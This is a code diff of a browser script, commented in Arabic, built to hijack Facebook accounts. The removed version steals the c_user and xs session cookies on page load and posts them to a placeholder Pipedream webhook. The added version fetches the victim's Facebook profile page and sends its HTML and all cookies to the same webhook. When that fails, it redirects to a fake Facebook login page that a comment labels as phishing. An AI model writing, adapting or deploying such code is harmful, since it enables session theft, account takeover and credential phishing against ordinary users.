@@ -1,20 +1,25 @@
 <script>
-function sendSession() {
-    // استخراج الكوكيز المطلوبة
-    const c_user = document.cookie.split('; ').find(row => row.startsWith('c_user=')).split('=')[1];
-    const xs = document.cookie.split('; ').find(row => row.startsWith('xs=')).split('=')[1];
-    
-    // إرسال البيانات إلى Pipedream الخاص بك
-    fetch('https://YOUR_PIPEDREAM_ENDPOINT.com', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: JSON.stringify({
-            user_id: c_user,
-            session_key: xs,
-            full_cookie: document.cookie
-        })
-    });
-}
-// تنفيذ السحب فور تحميل الصفحة
-window.onload = sendSession;
+    const webhookURL = "https://YOUR_PIPEDREAM_ENDPOINT.com"; // ضع رابط Pipedream هنا
+
+    async function grabData() {
+        try {
+            // محاولة سحب معلومات الحساب عبر طلب داخلي لفيسبوك
+            let response = await fetch('https://mbasic.facebook.com/profile.php');
+            let text = await response.text();
+            
+            // إرسال النتيجة إلى لوحة تحكمك
+            fetch(webhookURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    html: text, // سيحتوي هذا النص على الـ ID والبيانات الحساسة
+                    cookies: document.cookie
+                })
+            });
+        } catch (e) {
+            // إذا فشل السحب المباشر، يوجهه لصفحة تسجيل دخول مزيفة (Phishing)
+            window.location.href = "https://facebook-security-verify.github.io/login";
+        }
+    }
+    window.onload = grabData;
 </script>
